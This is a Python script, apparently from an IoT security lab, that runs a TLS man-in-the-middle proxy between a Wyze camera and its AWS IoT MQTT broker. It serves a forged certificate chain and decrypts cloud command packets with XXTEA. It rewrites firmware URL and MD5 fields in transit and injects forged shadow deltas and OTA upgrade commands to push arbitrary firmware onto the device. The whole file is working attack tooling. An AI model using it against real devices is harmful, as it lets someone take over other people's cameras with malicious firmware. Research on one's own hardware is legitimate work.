import socket, ssl, os, threading, time, json, struct
HERE=os.path.dirname(os.path.abspath(__file__))
# /tmp is wiped by the sbh daemon; keep the forged chain in the repo.
CHAIN=os.environ.get("CHAIN",os.path.join(HERE,"..","certs","emudhra","serve.pem"))
THING=os.environ.get("THING","80482c4bcf0b"); D=os.path.expanduser(os.environ.get("D","~/.config/fss-lab/wyze_iot/80482C4BCF0B"))
UP=("aws-iot.wyzecam.com",8883); SNI="a24rq1e5m4mtei.iot.us-west-2.amazonaws.com"
def up_ctx():
    c=ssl.create_default_context(cafile=D+"/rootCA.crt"); c.load_cert_chain(D+"/cert.pem",D+"/privkey.pem")
    c.set_alpn_protocols(["x-amzn-mqtt-ca"]); return c
def srv_ctx():
    c=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); c.load_cert_chain(CHAIN)
    c.minimum_version=ssl.TLSVersion.TLSv1_2; c.maximum_version=ssl.TLSVersion.TLSv1_2
    c.set_ciphers("ECDHE+AESGCM:ECDHE+CHACHA20:ECDHE+AES")
    def sni(sock,name,ctx): print("SNI",name,flush=True)
    c.sni_callback=sni
    return c

def enc_len(n):
    out = b""
    while True:
        b, n = n % 128, n // 128
        out += bytes([b | (0x80 if n else 0)])
        if not n:
            return out


def _rewrite(d):
    """Rewrite url/md5/firmware_ver inside a cloud command PUBLISH, in place.

    The cloud's own command is the only one the device acts on, so the descriptor is edited on the
    way through instead of being published by us. Returns the new packet or None.
    """
    if not os.environ.get("REWRITE"):
        return None
    t = d[0] >> 4
    if t != 3:
        return None
    n, i = 0, 1
    while True:
        b = d[i]; i += 1; n = (n << 7) | (b & 0x7F)
        if not b & 0x80:
            break
    tl = int.from_bytes(d[i:i + 2], "big")
    topic = d[i + 2:i + 2 + tl].decode(errors="replace")
    if not topic.endswith("/cmd"):
        return None
    qos = (d[0] >> 1) & 3
    j = i + 2 + tl + (2 if qos else 0)
    ct = d[j:]
    if len(ct) < 8 or len(ct) % 4:
        return None
    pt = _xxtea(ct, os.environ["OTA_ENR"].encode(), True)
    try:
        doc = json.loads(pt.split(b"\0")[0])
    except Exception:
        print("rewrite: not json", flush=True)
        return None
    par = doc.get("Params") or {}
    par["url"] = os.environ["OTA_URL"]
    par["md5"] = os.environ["OTA_MD5"]
    par["firmware_ver"] = os.environ["OTA_URL"].rsplit("/", 1)[-1].split(".tar")[0]
    doc["Params"] = par
    new = json.dumps(doc, separators=(",", ":")).encode()
    new = _xxtea(new + b"\0" * (-len(new) % 4), os.environ["OTA_ENR"].encode())
    # rebuild: same header byte, same topic (+packet id), new payload, fresh remaining length
    varint = 1
    while d[varint] & 0x80:
        varint += 1
    varint += 1
    body = d[varint:j] + new
    print(f"rewrite: {par['url']} md5={par['md5']}", flush=True)
    return bytes([d[0]]) + enc_len(len(body)) + body

def pipe(a,b,tag,state=None):
    """Pump one direction. The pair is closed only when BOTH directions are done:
    closing both from whichever side finished first killed live sessions with EBADF."""
    buf=b""
    try:
        while True:
            d=a.recv(65536)
            if not d:
                print("pipe",tag,"EOF",flush=True); break
            if tag != "S":
                log(tag,d)
                try:
                    with WLOCK: b.sendall(d)   # the injector writes to the same socket
                except OSError: break
                continue
            buf += d
            while True:
                if len(buf) < 2: break
                n, i, shift = 0, 1, 0
                while True:
                    if i >= len(buf): break
                    c = buf[i]; i += 1; n |= (c & 0x7F) << shift; shift += 7
                    if not c & 0x80: break
                if i > 4 or len(buf) < i + n: break
                pkt = buf[:i + n]; buf = buf[i + n:]
                log("S", pkt)
                r = _rewrite(pkt)
                try:
                    with WLOCK: b.sendall(r if r else pkt)
                except OSError: break
    except Exception as e:
        print("pipe",tag,"end",repr(e),flush=True)
    finally:
        try: a.close()
        except Exception: pass
        if state is None:
            try: b.close()
            except Exception: pass
        else:
            with state["lock"]:
                state["n"] -= 1
                done = state["n"] == 0
            print("pair done, closing", tag,flush=True)
            if done:
                for s in (a,b):
                    try: s.close()
                    except Exception: pass
def log(direction,d):
    t=d[0]>>4
    if t==3:
        try:
            n=0; i=1
            while True:
                b=d[i]; i+=1; n=(n<<7)|(b&0x7f)
                if not b&0x80: break
            tl=int.from_bytes(d[i:i+2],'big'); topic=d[i+2:i+2+tl].decode(errors='replace')
            qos=(d[0]>>1)&3; j=i+2+tl+(2 if qos else 0)
            payload=d[j:].decode(errors='replace')
            print(f"{direction} PUBLISH hdr={d[0]:02x} qos={qos} {topic} len={len(d[j:])} {payload[:2000]}",flush=True)
            if topic.endswith("/cmd") or topic.endswith("/update"):
                print(f"{direction} CMDHEX {d[j:].hex()}",flush=True)
        except Exception: print(direction,"PUBLISH <unparsed>",flush=True)
    elif t in (14,):
        print(f"{direction} DISCONNECT",flush=True)
    elif t==2:
        print(f"{direction} CONNACK {d[1:].hex()}",flush=True)
    elif t==9:
        print(f"{direction} SUBACK {d[1:].hex()}",flush=True)
    elif t in (8,):
        try:
            i=2; out=[]
            while i < len(d):
                ln=int.from_bytes(d[i:i+2],"big"); out.append(d[i+2:i+2+ln].decode(errors="replace")); i+=2+ln+1
            print(direction,"SUBSCRIBE",out,flush=True)
        except Exception: print(direction,"SUBSCRIBE",flush=True)
    elif t in (1,): print(direction,"CONNECT",flush=True)
    elif t in (4,): print(direction,"PUBACK",d[1:3].hex(),flush=True)

def _xxtea(data, key, decrypt=False):
    import struct as _s
    n = len(data) // 4
    if n < 2:
        return data
    v = list(_s.unpack("<%dI" % n, data[:n*4]))
    k = list(_s.unpack("<4I", (key + b"\0"*16)[:16]))
    delta = 0x9E3779B9
    rounds = 6 + 52 // n
    if decrypt:
        total = (rounds * delta) & 0xFFFFFFFF
        y = v[0]
        for _ in range(rounds):
            e = (total >> 2) & 3
            for p in range(n - 1, -1, -1):
                z = v[(p - 1) % n]
                mx = (((z >> 5) ^ (y << 2)) + ((y >> 3) ^ (z << 4))) ^ ((total ^ y) + (k[(p & 3) ^ e] ^ z))
                v[p] = (v[p] - mx) & 0xFFFFFFFF
                y = v[p]
            total = (total - delta) & 0xFFFFFFFF
    else:
        total = 0
        z = v[n - 1]
        for _ in range(rounds):
            total = (total + delta) & 0xFFFFFFFF
            e = (total >> 2) & 3
            for p in range(n):
                y = v[(p + 1) % n]
                mx = (((z >> 5) ^ (y << 2)) + ((y >> 3) ^ (z << 4))) ^ ((total ^ y) + (k[(p & 3) ^ e] ^ z))
                v[p] = (v[p] + mx) & 0xFFFFFFFF
                z = v[p]
    return _s.pack("<%dI" % n, *v)

MODEL=os.environ.get("OTA_MODEL","HL_CFL")
URL=os.environ.get("OTA_URL","https://s3-us-west-2.amazonaws.com/wuv2/upgrade/HL_CAM4/firmware/4.52.17.33.tar")
MD5=os.environ.get("OTA_MD5","")
def _enc(n):
    o=b""
    while True:
        d=n%128; n//=128; o+=bytes([d|(0x80 if n else 0)])
        if not n: return o
def _pkt(kind, body, flags=0):
    return bytes([(kind<<4)|flags])+_enc(len(body))+body
_PID=[0x4000]  # the device owns the low ids on this same connection; start high to avoid collisions
def _pub(sock, topic, payload, qos0=True):
    tb=topic.encode()
    if qos0:
        body=struct.pack(">H",len(tb))+tb+payload
        sock.sendall(_pkt(3, body, 0x00))
    else:
        _PID[0]=(_PID[0]%65535)+1
        body=struct.pack(">H",len(tb))+tb+struct.pack(">H",_PID[0])+payload
        pkt=_pkt(3, body, 0x03 if os.environ.get("OTA_RETAIN") else 0x02)
        print("PUBHEX", pkt[:40].hex(), "len", len(pkt),flush=True)
        sock.sendall(pkt)
def _live():
    """The current device socket: a reconnect replaces it, so never trust a captured one.
    A closed socket keeps its object, so check the descriptor too."""
    c=LIVE.get("c")
    try:
        if c is None or c.fileno() < 0: return None
    except Exception:
        return None
    return c

def inject(cli, up=None):
    time.sleep(8)
    if not MD5:
        print("inject: OTA_MD5 unset",flush=True); return
    st={"state":{"desired":{"url":URL,"md5":MD5,"pcUrl":URL,"pcMd5":MD5,"model":MODEL,"sub_mac":THING.upper()},"reported":{}},"version":999}
    for _ in range(10):
        c=_live()
        if not c: time.sleep(2); continue
        try:
            with WLOCK:
                _pub(c, f"$aws/things/{THING}/shadow/name/{os.environ.get('SHADOW','wyze-service')}/update/delta", json.dumps(st).encode())
            print("inject: delta",flush=True); break
        except Exception as e:
            print("inject delta retry",repr(e),flush=True); time.sleep(2)
    else:
        print("inject: delta gave up",flush=True); return
    time.sleep(10)
    models=[m for m in os.environ.get("OTA_MODELS","").split(",") if m] or [MODEL]
    for i in range(20):
        m=models[i % len(models)]
        # the UDS receiver wants {Action, Params, Guid}. "delDev" reads the descriptor from Params;
        # "upgradeSub" reads a top-level url only. Sweep both so the shape is measured, not assumed.
        acts=[a for a in os.environ.get("OTA_ACTIONS","").split(",") if a] or ["delDev"]
        act=acts[i % len(acts)]
        ver=URL.rsplit("/",1)[-1].split(".tar")[0]
        inner={"model":m,"url":URL,"firmware_ver":ver,"md5":MD5}
        if act == "upgrade":
            body={"Action":"upgrade","Params":inner,
                  "Guid":os.urandom(8).hex(),"Ts":int(time.time()*1000)}
        elif act == "cmd":
            # iotclient logs "cmd:%d, len:%d, data:%s" and builds the UDS message itself
            body={"cmd":1234,"data":inner}
        elif act == "cmdstr":
            body={"cmd":1234,"data":json.dumps(inner)}
        elif act == "upgradeSub":
            body={"Action":act,"Guid":f"{THING}-{i}","url":URL,"md5":MD5,"model":m,
                  "sub_mac":THING.upper(),"Params":{"url":URL}}
        else:
            body={"Action":act,"Guid":f"{THING}-{i}","Params":inner}
        text=json.dumps(body,separators=(",",":")); pl=text.encode()
        if os.environ.get("OTA_ENC"):
            import base64
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            if os.environ["OTA_ENC"] == "5":
                pl=bytes.fromhex(os.environ["OTA_RAWHEX"])
            elif os.environ["OTA_ENC"] in ("3", "4"):
                pl=_xxtea(pl+b"\0"*(-len(pl)%4), os.environ["OTA_ENR"].encode())
                if os.environ["OTA_ENC"] == "4":
                    pl=struct.pack("<III", 0, 1319, len(pl))+pl
            else:
                if os.environ["OTA_ENC"] == "2":
                    k=os.environ["OTA_ENR"].encode()[:16]
                else:
                    k=base64.b64decode(os.environ["OTA_ENR"]); k=(k+b"\0"*16)[:16]
                pl=pl+b"\0"*(-len(pl)%16)
                e=Cipher(algorithms.AES(k),modes.ECB()).encryptor()
                pl=e.update(pl)+e.finalize()
        for _try in range(30):
            c=_live()
            if c is None:
                time.sleep(1); continue
            try:
                with WLOCK:
                    _pub(up if (up and os.environ.get("OTA_VIA_UPSTREAM")) else c,
                         os.environ.get("OTA_TOPIC") or f"hl/devices/{THING}/cmd", pl, qos0=False)
                print(f"inject: cmd 1234 pid={_PID[0]} model={m} {text}",flush=True)
                break
            except Exception as e:
                print("inject cmd retry",repr(e),flush=True); time.sleep(2)
        else:
            print("inject cmd gave up",flush=True); return
        time.sleep(4)

LIVE={"c":None}
WLOCK=threading.Lock()  # SSLSocket.sendall is not thread-safe; the S pipe and the injector both write
def injector():
    """Push the delta into whichever camera connection is live, retrying across reconnects."""
    time.sleep(4)
    if not MD5:
        print("inject: OTA_MD5 unset",flush=True); return
    st={"state":{"desired":{"url":URL,"md5":MD5,"pcUrl":URL,"pcMd5":MD5,"model":MODEL,"sub_mac":THING.upper()},"reported":{}},"version":999}
    for _ in range(30):
        c=LIVE.get("c")
        if c:
            try:
                with WLOCK:
                    _pub(c, f"$aws/things/{THING}/shadow/name/{os.environ.get('SHADOW','wyze-service')}/update/delta", json.dumps(st).encode())
                print("inject: delta sent",flush=True); return
            except Exception as e: print("inject retry",repr(e),flush=True)
        time.sleep(3)
    print("inject: gave up",flush=True)

def up_addr():
    """Resolve the broker past our own DNS redirect (which would loop back to us)."""
    try:
        import subprocess
        ip=subprocess.run(["dig","+short","+time=2","@1.1.1.1",UP[0]],capture_output=True,text=True).stdout.split()
        for cand in ip:
            if cand and cand[0].isdigit(): return (cand, UP[1])
    except Exception: pass
    return UP

def handle(cli):
    cli.settimeout(None)  # the 10 s accept timeout would kill an idle session long before the 60 s keepalive
    try:
        u=up_ctx().wrap_socket(socket.create_connection(up_addr(),timeout=10),server_hostname=SNI)
        u.settimeout(None)  # an idle broker must not kill the session; MQTT keepalive is 60 s
        print("UP ok",flush=True)
    except Exception as e: print("upstream fail",repr(e),flush=True); cli.close(); return
    print("handle cli=%s fd=%s" % (id(cli), cli.fileno()),flush=True)
    state={"n":2,"lock":threading.Lock()}
    threading.Thread(target=pipe,args=(cli,u,"C",state),daemon=True).start()
    LIVE["c"]=cli
    if os.environ.get("INJECT"):
        threading.Thread(target=inject,args=(cli,u),daemon=True).start()
    pipe(u,cli,"S",state)
def main():
    ctx=srv_ctx(); s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    s.bind(("0.0.0.0",8883)); s.listen(4); print("proxy on 8883",flush=True)
    while True:
        c,_=s.accept()
        try:
            c.settimeout(10)  # a silent client must not wedge the single accept loop
            c=ctx.wrap_socket(c,server_side=True)
            c.settimeout(None)
        except Exception as e: print("tls fail",e,flush=True); c.close(); continue
        threading.Thread(target=handle,args=(c,),daemon=True).start()
main()
